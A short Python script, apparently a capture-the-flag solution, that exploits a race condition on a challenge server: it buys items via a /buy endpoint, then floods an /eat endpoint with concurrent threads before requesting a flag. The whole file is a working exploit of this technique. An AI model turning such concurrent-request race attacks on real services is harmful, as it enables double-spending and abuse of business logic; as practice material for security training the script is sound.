import requests
import threading

url = "http://fatty.putcyberdays.pl/"
s = requests.Session()

cookies = []

while True:
    res = s.post(f'{url}/buy')
    
    if "cookie_id" not in res.json():
        break

    cookies.append(res.json()['cookie_id'])

def eat(cookie_id):
    s.post(f"{url}/eat", json={"cookie_id": cookie_id})

    res = s.get(f'{url}/flag')
    data = res.json()
    
    if "flag" in data:
        print("Flag:", data['flag'])

threads = []

for _ in range(50):
    for cookie in cookies:
        t = threading.Thread(target=eat, args=(cookie,))
        t.start()
        threads.append(t)

for t in threads:
    t.join()